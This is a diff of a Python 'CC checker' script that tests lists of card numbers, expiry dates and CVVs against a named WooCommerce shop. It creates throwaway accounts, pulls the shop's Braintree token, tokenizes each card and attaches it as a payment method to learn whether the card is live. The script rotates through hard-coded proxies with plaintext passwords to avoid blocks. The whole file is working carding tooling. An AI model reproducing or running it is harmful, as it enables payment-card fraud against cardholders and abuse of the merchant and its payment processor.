@@ -12,41 +12,54 @@ def generate_random_user_email():
     username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
     number_suffix = str(random.randint(1000, 9999))
     email = f"{username}{number_suffix}@gmail.com"
-    print(f"[DEBUG] Generated username: {username}, email: {email}")
     return username, email
+    
+#mass checker by @eye_am_sahil
+ 
+proxies =[
+    '142.147.128.93:6593:enrudmml:8my0p739wqwf',
+    '136.0.207.84:6661:hnlsoiho:uw47j8uvzjyn',
+    '142.147.128.93:6593:hnlsoiho:uw47j8uvzjyn',
+    '198.23.239.134:6540:enrudmml:8my0p739wqwf',
+    '207.244.217.165:6712:enrudmml:8my0p739wqwf',
+    '107.172.163.27:6543:enrudmml:8my0p739wqwf',
+    '216.10.27.159:6837:enrudmml:8my0p739wqwf',
+    '136.0.207.84:6661:enrudmml:8my0p739wqwf',]
+    #'ip:port:user:pass',
 
-def get_fixed_proxy():
-    host = "rp.scrapegw.com"
-    port = "6060"
-    user = "ie3ieg1qrz2kxh6-country-de"
-    password = "vr4lycad71fgnoj"
-    proxy_url = f"http://{user}:{password}@{host}:{port}"
-    print(f"[DEBUG] Using fixed proxy: {proxy_url}")
+def get_random_proxy():
+    proxy_str = random.choice(proxies)
+    parts = proxy_str.split(':')
+    if len(parts) == 4:
+        ip, port, user, pwd = parts
+        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+    else:
+        proxy_url = f"http://{proxy_str}"
     return {
         'http': proxy_url,
         'https': proxy_url
     }
+
+
 
 def split_cc_details(cc_line):
     """Split a CC line into its components"""
     parts = cc_line.strip().split('|')
     if len(parts) != 4:
         raise ValueError(f"Invalid CC format. Expected 'card|mm|yyyy|cvv', got: {cc_line}")
-    print(f"[DEBUG] Split CC details: {parts}")
+    
     return {
         'number': parts[0],
         'exp_month': parts[1],
         'exp_year': parts[2],
         'cvv': parts[3]
     }
-
-def process_cc(cc_details, proxy=None):
-    print(f"\n[DEBUG] Starting processing for CC: {cc_details['number']}|{cc_details['exp_month']}|{cc_details['exp_year']}|{cc_details['cvv']}")
+    
+    
+def process_cc(cc_details,proxy=None):
     session = requests.Session()
     if proxy:
         session.proxies.update(proxy)
-        print(f"[DEBUG] Proxy set for session")
-
     headers = {
         'Referer': 'https://www.calipercovers.com/',
         'Upgrade-Insecure-Requests': '1',
@@ -55,22 +68,16 @@ def process_cc(cc_details, proxy=None):
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Android"',
     }
-
-    print("[DEBUG] Sending GET to /my-account/")
+    print(f"\nProcessing CC: {cc_details['number']}|{cc_details['exp_month']}|{cc_details['exp_year']}|{cc_details['cvv']}")    
     response = session.get('https://www.calipercovers.com/my-account/', headers=headers)
-    print(f"[DEBUG] /my-account/ response status: {response.status_code}")
     if response.status_code != 200:
         print(f"❌ Dead proxy or blocked: HTTP {response.status_code}. Skipping this CC.")
         return
-
-    soup = BeautifulSoup(response.text, 'html.parser')
-    nonce = soup.find(id="woocommerce-register-nonce")
-    if not nonce:
-        print("[DEBUG] Woocommerce register nonce not found!")
-        return
-
+    soup=BeautifulSoup(response.text,'html.parser')
+    
+    nonce=soup.find(id="woocommerce-register-nonce")
     username, email = generate_random_user_email()
-
+    
     headers = {
         'authority': 'www.calipercovers.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -89,7 +96,7 @@ def process_cc(cc_details, proxy=None):
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
     }
-
+    
     data = {
         'username': username,
         'email': email,
@@ -114,11 +121,12 @@ def process_cc(cc_details, proxy=None):
         '_wp_http_referer': '/my-account/',
         'register': 'Register',
     }
-
-    print("[DEBUG] Submitting registration POST")
+    
     response = session.post('https://www.calipercovers.com/my-account/', headers=headers, data=data)
-    print(f"[DEBUG] Registration POST response status: {response.status_code}")
-
+    
+    #registration done here
+    
+    
     headers = {
         'authority': 'www.calipercovers.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -134,42 +142,54 @@ def process_cc(cc_details, proxy=None):
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
     }
-
-    print("[DEBUG] Getting payment method page")
-    response = session.get('https://www.calipercovers.com/my-account/payment-methods/', headers=headers)
-    print(f"[DEBUG] Payment methods page response status: {response.status_code}")
-
-    print("[DEBUG] Getting add payment method page")
-    response = session.get('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers)
-    print(f"[DEBUG] Add payment method page response status: {response.status_code}")
-
-    html_text = response.text
-
+    
+    response = session.get('https://www.calipercovers.com/my-account/payment-methods/',headers=headers)
+    
+    headers = {
+        'authority': 'www.calipercovers.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'referer': 'https://www.calipercovers.com/my-account/payment-methods/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+    }
+    
+    response = session.get('https://www.calipercovers.com/my-account/add-payment-method/',headers=headers)
+    
+    html_text = response.text  # assign response text to a string variable
+    
+    
     match = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', html_text)
     if match:
         client_token = match.group(1)
-        print("[DEBUG] Found wc_braintree_client_token")
     else:
         print("❌ wc_braintree_client_token not found!")
-        return
-
+        
     decoded_token = base64.b64decode(client_token).decode('utf-8')
-
+    
+    
     match = re.search(r'authorizationFingerprint":"([^"]+)"', decoded_token)
     if match:
         at = match.group(1)
-        print("[DEBUG] Extracted authorizationFingerprint")
     else:
         print("authorizationFingerprint not found!")
-        return
-
-    soup = BeautifulSoup(response.text, 'html.parser')
-
-    nonce1 = soup.find(id="woocommerce-add-payment-method-nonce")
-    if not nonce1:
-        print("[DEBUG] Woocommerce add payment method nonce not found!")
-        return
-
+        
+    soup=BeautifulSoup(response.text,'html.parser')
+    
+    #woocommerce-add-payment-method-nonce
+    
+    nonce1=soup.find(id="woocommerce-add-payment-method-nonce")
+    
+    
+    
+    
     headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
@@ -187,7 +207,7 @@ def process_cc(cc_details, proxy=None):
         'sec-fetch-site': 'cross-site',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
     }
-
+    
     json_data = {
         'clientSdkMetadata': {
             'source': 'client',
@@ -198,8 +218,8 @@ def process_cc(cc_details, proxy=None):
         'variables': {
             'input': {
                 'creditCard': {
-                    'number': cc_details['number'],
-                    'expirationMonth': cc_details['exp_month'],
+                    'number':cc_details['number'],
+                    'expirationMonth':cc_details['exp_month'],
                     'expirationYear': cc_details['exp_year'],
                     'cvv': cc_details['cvv'],
                     'billingAddress': {
@@ -214,18 +234,13 @@ def process_cc(cc_details, proxy=None):
         },
         'operationName': 'TokenizeCreditCard',
     }
-
-    print("[DEBUG] Sending tokenization request to Braintree API")
+    
     response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-    print(f"[DEBUG] Braintree tokenization response status: {response.status_code}")
-
-    try:
-        tok = response.json()['data']['tokenizeCreditCard']['token']
-        print("[DEBUG] Received token from Braintree")
-    except Exception as e:
-        print(f"❌ Error getting token from Braintree response: {e}")
-        return
-
+    
+    tok = response.json()['data']['tokenizeCreditCard']['token']
+    
+    
+    
     headers = {
         'authority': 'www.calipercovers.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -244,7 +259,7 @@ def process_cc(cc_details, proxy=None):
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
     }
-
+    
     data = {
         'payment_method': 'braintree_cc',
         'braintree_cc_nonce_key': tok,
@@ -255,56 +270,66 @@ def process_cc(cc_details, proxy=None):
         '_wp_http_referer': '/my-account/add-payment-method/',
         'woocommerce_add_payment_method': '1',
     }
-
-    print("[DEBUG] Adding payment method POST")
+    
     response = session.post(
         'https://www.calipercovers.com/my-account/add-payment-method/',
         headers=headers,
         data=data,
     )
-    print(f"[DEBUG] Add payment method response status: {response.status_code}")
-
-    text = response.text
+    
+    text = response.text  # HTML response
     soup = BeautifulSoup(text, 'html.parser')
-
+    
+    # STEP 1: Check if payment was successful
     if 'Payment method successfully added.' in text:
         print("APPROVED ✅️")
+    
     else:
+        # STEP 2: If not approved, look for woocommerce-error block
         error_ul = soup.find('ul', class_='woocommerce-error')
         if error_ul:
             full_error_text = error_ul.get_text(strip=True)
+    
+            # Try to extract "Reason: ..."
             match = re.search(r'Reason:\s*(.*)', full_error_text)
             if match:
                 reason = match.group(1).strip()
-                print(f"❌ Declined - Reason: {reason}")
+                print(reason)
             else:
-                print(f"❌ Declined - {full_error_text}")
+                # No specific reason, print full error
+                print(full_error_text)
         else:
-            print("❓ No success or error message found.\n")
-
+            # No error message found at all
+            print("❓ No success or error message found./n")
+        
 def main():
     use_proxy = input("🛡️ Do you want to continue with proxy? (y/n): ").strip().lower() == 'y'
 
     try:
         with open('cc.txt', 'r') as f:
             cc_lines = f.readlines()
-        print(f"[DEBUG] Loaded {len(cc_lines)} cards from cc.txt")
     except FileNotFoundError:
         print("❌ cc.txt file not found in current directory")
         return
 
-    for idx, cc_line in enumerate(cc_lines, 1):
-        print(f"[DEBUG] Processing card {idx}/{len(cc_lines)}")
+    for cc_line in cc_lines:
         try:
             cc_details = split_cc_details(cc_line)
-            proxy = get_fixed_proxy() if use_proxy else None
+
+            # Use proxy only if user said yes
+            proxy = get_random_proxy() if use_proxy else None
+
+            # Pass proxy to process_cc
             process_cc(cc_details, proxy)
+
         except Exception as e:
-            print(f"❌ Error processing CC: {e}")
+            print(f"❌ Error processing CC: {str(e)}")
             continue
-        time.sleep(4)  # 4 seconds delay
+
+        time.sleep(4)  # 0.5 seconds delay per card
 
 if __name__ == "__main__":
     print("Starting CC checker...")
     main()
     print("\nProcessing complete.")
+        
